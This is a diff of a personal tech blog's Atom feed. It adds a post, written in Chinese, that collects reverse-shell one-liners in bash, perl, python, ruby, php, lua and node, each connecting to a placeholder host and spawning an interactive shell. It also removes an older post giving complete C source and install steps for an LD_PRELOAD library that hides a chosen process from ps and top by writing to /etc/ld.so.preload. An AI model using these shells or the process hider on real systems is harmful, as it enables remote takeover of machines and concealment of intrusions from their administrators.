@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://vincentstudio.info/"/>
-  <updated>2020-03-12T15:23:16.388Z</updated>
+  <updated>2020-04-28T15:47:45.105Z</updated>
   <id>https://vincentstudio.info/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>常见的反弹Shell</title>
+    <link href="https://vincentstudio.info/2020/04/28/050_Reverse_shell/"/>
+    <id>https://vincentstudio.info/2020/04/28/050_Reverse_shell/</id>
+    <published>2020-04-28T15:00:00.000Z</published>
+    <updated>2020-04-28T15:47:45.105Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>假设服务端 <code>IP</code> 假设为 <code>123.123.123.123</code> 开放端口 <code>8090</code> 用于监听。</p><pre><code class="lang-bash">nc -lvvp 8090</code></pre><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="1-bash"><a href="#1-bash" class="headerlink" title="1. bash"></a>1. bash</h3><pre><code>bash -i &gt;&amp; /dev/tcp/123.123.123.123/8090 0&gt;&amp;1</code></pre><h3 id="2-perl"><a href="#2-perl" class="headerlink" title="2. perl"></a>2. perl</h3><pre><code class="lang-bash">perl -e &#39;use Socket;$i=&quot;123.123.123.123&quot;;$p=8090;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};&#39;</code></pre><h3 id="3-python"><a href="#3-python" class="headerlink" title="3. python"></a>3. python</h3><pre><code class="lang-bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;123.123.123.123&quot;,8090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="4-ruby"><a href="#4-ruby" class="headerlink" title="4. ruby"></a>4. ruby</h3><pre><code class="lang-bash">ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;123.123.123.123&quot;,&quot;8090&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre><h3 id="5-php"><a href="#5-php" class="headerlink" title="5. php"></a>5. php</h3><pre><code class="lang-bash">php -r &#39;$sock=fsockopen(&quot;123.123.123.123&quot;,8090);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="6-lua"><a href="#6-lua" class="headerlink" title="6. lua"></a>6. lua</h3><pre><code class="lang-bash">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><h3 id="7-node"><a href="#7-node" class="headerlink" title="7. node"></a>7. node</h3><pre><code class="lang-javascript">(function(){    var net = require(&quot;net&quot;),    cp = require(&quot;child_process&quot;),    sh = cp.spawn(&quot;/bin/sh&quot;, []);    var client = new net.Socket();    client.connect(8090, &quot;123.123.123.123&quot;, function(){        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    });    return &quot;Connected&quot;;})();</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
+      
+    
+    </summary>
+    
+      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
+    
+    
+      <category term="Test" scheme="https://vincentstudio.info/tags/Test/"/>
+    
+  </entry>
   
   <entry>
     <title>压测工具整理</title>
@@ -497,33 +522,6 @@
     </summary>
     
       <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
-    
-    
-      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
-    
-      <category term="Security" scheme="https://vincentstudio.info/tags/Security/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>如何隐藏 Linux 进程</title>
-    <link href="https://vincentstudio.info/2019/05/19/030_How_to_Hide_Linux_Process/"/>
-    <id>https://vincentstudio.info/2019/05/19/030_How_to_Hide_Linux_Process/</id>
-    <published>2019-05-19T15:50:00.000Z</published>
-    <updated>2020-01-30T08:29:43.725Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在学习 linux 内核原理，纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="ps指令是如何工作的？"><a href="#ps指令是如何工作的？" class="headerlink" title="ps指令是如何工作的？"></a><code>ps</code>指令是如何工作的？</h2><p>我们可以使用 <code>sysdig</code> 跟踪 <code>ps</code> 指令的执行细节</p><pre><code class="lang-bash">$ sysdig proc.name = ps...2088196 23:47:45.419817127 7 ps (22956) &gt; openat2088197 23:47:45.419818054 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/stat) dirfd=-100(AT_FDCWD) name=/proc/30245/stat flags=1(O_RDONLY) mode=02088198 23:47:45.419818411 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/stat) size=20482088199 23:47:45.419819843 7 ps (22956) &lt; read res=182 data=30245 ((sd-pam)) S 30244 30244 30244 0 -1 1077936448 46 0 0 0 0 0 0 0 20 0 1 0 12088200 23:47:45.419820050 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/stat)2088201 23:47:45.419820178 7 ps (22956) &lt; close res=02088202 23:47:45.419822308 7 ps (22956) &gt; openat2088203 23:47:45.419824137 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/status) dirfd=-100(AT_FDCWD) name=/proc/30245/status flags=1(O_RDONLY) mode=02088204 23:47:45.419824495 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/status) size=20482088205 23:47:45.419829683 7 ps (22956) &lt; read res=1329 data=Name:.(sd-pam).Umask:.0002.State:.S (sleeping).Tgid:.30245.Ngid:.0.Pid:.30245.PP2088206 23:47:45.419829879 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/status)2088207 23:47:45.419830002 7 ps (22956) &lt; close res=02088208 23:47:45.419831829 7 ps (22956) &gt; getdents fd=5(&lt;d&gt;/proc)2088209 23:47:45.419833030 7 ps (22956) &lt; getdents res=02088210 23:47:45.419834153 7 ps (22956) &gt; close fd=5(&lt;d&gt;/proc)2088211 23:47:45.419834873 7 ps (22956) &lt; close res=0...</code></pre><p>由此可以分析出 <code>ps</code> 的执行流程如下：</p><ol><li>通过 <code>openat</code> 函数打开目录 <code>/proc</code>。</li><li>在该进程在打开的目录上调用 <code>getdents</code> 函数，得到 <code>/proc</code> 下的目录列表</li><li>遍历每个子目录中的一组固定文件。从事件列表中可以看到，这些文件名为 <code>/proc/{PID}/status</code>，<code>/proc/PID/stat</code> 和 <code>/proc/PID/cmdline</code>，即为 <code>ps</code> 输出的信息。</li></ol><blockquote><p>进程本身不直接调用 <code>openat</code> 和 <code>getdents</code>， 因为这些是由C标准库（<code>libc</code>）抽象的系统调用。如果你曾经读过 <code>libc</code> 文档，<code>libc</code> 提供了两个不同的函数，<code>opendir</code> 和 <code>readdir</code>，它们负责自己调用系统调用，为开发人员提供了一个更简单的API。</p></blockquote><h2 id="3种隐藏进程的思路"><a href="#3种隐藏进程的思路" class="headerlink" title="3种隐藏进程的思路"></a>3种隐藏进程的思路</h2><ol><li>修改替换类似 <code>ps</code>、<code>lsof</code>、<code>top</code>、<code>htop</code> … 等常用运维工具的二进制文件。</li><li>覆盖 <code>libc</code> 中的 <code>readdir</code> 函数</li><li>修改内核中的系统调用，hook 系统的 <code>getdents</code> 事件</li></ol><p>下文采用第二种方法来实现</p><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><h3 id="新建-processhider-c"><a href="#新建-processhider-c" class="headerlink" title="新建 processhider.c"></a>新建 <code>processhider.c</code></h3><p>修改 <code>process_to_filter</code> 为你要隐藏的进程名</p><pre><code class="lang-c">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;dirent.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;// !!! Replace to your Process Namestatic const char* process_to_filter = &quot;test.py&quot;;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)                                \static struct dirent* (*original_##readdir)(DIR*) = NULL;               \                                                                        \struct dirent* readdir(DIR *dirp)                                       \{                                                                       \    if(original_##readdir == NULL) {                                    \        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \        if(original_##readdir == NULL)                                  \        {                                                               \            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \        }                                                               \    }                                                                   \                                                                        \    struct dirent* dir;                                                 \                                                                        \    while(1)                                                            \    {                                                                   \        dir = original_##readdir(dirp);                                 \        if(dir) {                                                       \            char dir_name[256];                                         \            char process_name[256];                                     \            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \                strcmp(process_name, process_to_filter) == 0) {         \                continue;                                               \            }                                                           \        }                                                               \        break;                                                          \    }                                                                   \    return dir;                                                         \}DECLARE_READDIR(dirent64, readdir64);DECLARE_READDIR(dirent, readdir);</code></pre><h3 id="编译成动态链接库"><a href="#编译成动态链接库" class="headerlink" title="编译成动态链接库"></a>编译成动态链接库</h3><pre><code class="lang-bash">$ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl$ mv libprocesshider.so /usr/local/lib/</code></pre><h3 id="覆盖系统调用"><a href="#覆盖系统调用" class="headerlink" title="覆盖系统调用"></a>覆盖系统调用</h3><p><code>/etc/ld.so.preload</code> 这是个神奇的文件，写在这个文件里的库会比系统标准库优先调用。因此我们只要把刚才生成好的动态链接库添加到这个文件中就大功告成了</p><pre><code class="lang-bash">$ echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>新建一个测试文件 <code>test.py</code></p><pre><code class="lang-python">#!/usr/bin/pythonwhile True:    print &quot;Hello&quot;</code></pre><p>执行</p><pre><code class="lang-bash">$ chmod +x test.py$ ./test.py</code></pre><p>再开一个 <code>terminal</code> 查看 <code>ps</code> 或者 <code>top</code>，发现 <code>test.py</code> 已经不见了。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
     
     
       <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
